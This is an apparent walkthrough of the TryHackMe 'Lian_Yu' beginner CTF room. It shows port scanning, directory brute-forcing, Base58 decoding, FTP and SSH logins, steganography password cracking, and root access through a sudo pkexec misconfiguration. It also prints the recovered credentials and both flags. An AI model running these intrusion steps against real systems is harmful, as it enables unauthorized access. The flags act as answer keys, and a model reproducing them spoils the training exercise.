# Lian_Yu

A beginner level security challenge

[Lian_Yu](https://tryhackme.com/room/lianyu)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Cryptography
  - Base58
- Steganography
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Find the Flags

Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ sudo nmap -sS -sC -sV -O 10.10.70.37
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 14:14 CEST
Nmap scan report for 10.10.70.37
Host is up (0.031s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32816/tcp6  status
|   100024  1          34073/udp6  status
|   100024  1          34658/udp   status
|_  100024  1          49989/tcp   status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/5%OT=21%CT=1%CU=31619%PV=Y%DS=2%DC=I%G=Y%TM=5F7B0E2
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
```

1. Deploy the VM and Start the Enumeration.

`No answer needed`

2. What is the Web Directory you found?

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ gobuster dir -u http://10.10.70.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.70.37/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/05 14:15:59 Starting gobuster
===============================================================
/island (Status: 301)
Progress: 88574 / 220561 (40.16%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/05 14:21:20 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ gobuster dir -u http://10.10.70.37/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.70.37/island/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/05 14:19:20 Starting gobuster
===============================================================
/2100 (Status: 301)
Progress: 33560 / 220561 (15.22%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/05 14:21:21 Finished
===============================================================
```

`2100`

3. what is the file name you found?

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ gobuster dir -u http://10.10.70.37/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.70.37/island/2100/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ticket
[+] Timeout:        10s
===============================================================
2020/10/05 14:23:26 Starting gobuster
===============================================================
/green_arrow.ticket (Status: 200)
Progress: 14795 / 220561 (6.71%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/05 14:25:06 Finished
===============================================================
```

`green_arrow.ticket`

5. what is the FTP Password?

- [view-source:http://10.10.70.37/island/2100/green_arrow.ticket](view-source:http://10.10.70.37/island/2100/green_arrow.ticket)

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

![https://www.dcode.fr/base-58-cipher](https://www.dcode.fr/base-58-cipher)

`!#th3h00d`

6. what is the file name with SSH password?

- [view-source:http://10.10.70.37/island/](view-source:http://10.10.70.37/island/)

```html
<h2 style="color:white"> vigilante</style></h2>
```

`vigilante`

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ ftp 10.10.70.37
Connected to 10.10.70.37.
220 (vsFTPd 3.0.2)
Name (10.10.70.37:kali): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> mget *
mget Leave_me_alone.png?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 0.41 secs (1.1982 MB/s)
mget Queen's_Gambit.png?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 0.22 secs (2.3825 MB/s)
mget aa.jpg?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 0.12 secs (1.5225 MB/s)
ftp> pwd
257 "/home/vigilante"
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
257 "/home"
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01 06:55 slade
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 vigilante
226 Directory send OK.
ftp> exit
221 Goodbye.
```

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 196 passwords
Your file has been written to: aa.jpg.out
password
kali@kali:~/CTFs/tryhackme/Lian_Yu$ unzip aa.jpg.out
Archive:  aa.jpg.out
  inflating: passwd.txt
  inflating: shado
kali@kali:~/CTFs/tryhackme/Lian_Yu$ cat shado
M3tahuman
kali@kali:~/CTFs/tryhackme/Lian_Yu$
```

`shado`

1. user.txt

```
kali@kali:~/CTFs/tryhackme/Lian_Yu$ ssh slade@10.10.70.37
The authenticity of host '10.10.70.37 (10.10.70.37)' can't be established.
ECDSA key fingerprint is SHA256:Rc91rXUKn9aMcuwG8LxCUejBAjP+xNW74MfLbPqUuhc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.70.37' (ECDSA) to the list of known hosts.
slade@10.10.70.37's password:
                              Way To SSH...
                          Loading.........Done..
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

slade@LianYu:~$
```

`THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

2. root.txt

```
slade@LianYu:~$ sudo -l
[sudo] password for slade:
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo pkexec ls /root
root.txt
slade@LianYu:~$ sudo pkexec cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

slade@LianYu:~$
```

`THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`
